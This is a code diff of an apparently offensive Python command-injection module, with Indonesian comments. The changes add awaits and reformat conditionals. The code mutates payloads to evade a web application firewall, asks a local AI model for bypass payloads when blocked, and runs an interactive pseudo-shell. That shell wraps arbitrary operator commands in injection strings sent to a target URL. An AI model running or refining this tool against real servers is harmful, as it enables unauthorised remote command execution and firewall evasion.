@@ -99,10 +99,11 @@ class CommandInjectionModule(BaseModule):
             pass
         return False, False
 
-async def run_audit(self, session: aiohttp.ClientSession) -> bool:
+    async def run_audit(self, session: aiohttp.ClientSession) -> bool:
+        """Menjalankan audit command injection dengan strategi WAF bypass."""
         print("[*] Menjalankan Modul V17.2: OS Command Injection...")
         os_log_capture: str = os.path.join(config.SERVER_LOG_DIR, "syslog")
-        headers: dict = self.auditor._get_random_headers()
+        headers: dict = await self.auditor._get_random_headers()  # FIX: Added await
         payloads: List[str] = self.load_payloads()
         found_any_vuln: bool = False
 
@@ -110,16 +111,22 @@ async def run_audit(self, session: aiohttp.ClientSession) -> bool:
             for strategy in range(4):
                 payload = self.auditor.mutate_payload_for_waf(base_payload, strategy)
                 success, trigger_ai = await self.execute_and_evaluate(session, payload, base_payload, headers, os_log_capture)
-                if success: found_any_vuln = True; break
+                if success: 
+                    found_any_vuln = True
+                    break
                 if trigger_ai:
                     ai_payload = await self.auditor.ask_local_ai_to_bypass_waf(session, base_payload, "WAF_BLOCK")
                     if ai_payload:
                         success_ai, _ = await self.execute_and_evaluate(session, ai_payload, base_payload, headers, os_log_capture)
-                        if success_ai: found_any_vuln = True; break
-            if found_any_vuln: break
+                        if success_ai: 
+                            found_any_vuln = True
+                            break
+            if found_any_vuln: 
+                break
         return found_any_vuln
 
     async def interactive_pseudo_shell(self, session: aiohttp.ClientSession) -> None:
+        """Interactive pseudo shell untuk command injection yang terverifikasi."""
         print("\n======================================================================")
         print("[++++] GERBANG WATER-SHELL INTERAKTIF V17.2 ABSOLUTE ENGINE ONLINE [++++]")
         print("[*] Status: Jalur latar belakang dikunci total. Operator memegang kendali penuh.")
@@ -133,7 +140,8 @@ async def run_audit(self, session: aiohttp.ClientSession) -> bool:
                 prompt_label = f"water-shell [{current_working_dir if current_working_dir else 'root'}]> "
                 user_cmd = await loop.run_in_executor(None, input, f"\033[1;32m{prompt_label}\033[0m")
                 user_cmd = user_cmd.strip()
-                if not user_cmd: continue
+                if not user_cmd: 
+                    continue
                 if user_cmd.lower() in ["exit", "quit"]: 
                     print("[*] Keluar dari Gerbang Shell Terisolasi.")
                     sys.exit(0)
@@ -156,7 +164,7 @@ async def run_audit(self, session: aiohttp.ClientSession) -> bool:
                     wrapped_cmd = f"echo {token_awal} && {user_cmd} && echo {token_akhir}"
                 
                 payload_interaktif = f"/**/;/**/;{wrapped_cmd}/**/;/**/"
-                headers = self.auditor._get_random_headers()
+                headers = await self.auditor._get_random_headers()  # FIX: Added await
                 
                 if self.auditor.method == "POST":
                     async with session.post(self.auditor.target_url, data={self.auditor.parameter: payload_interaktif}, headers=headers, timeout=self.auditor.timeout) as res:
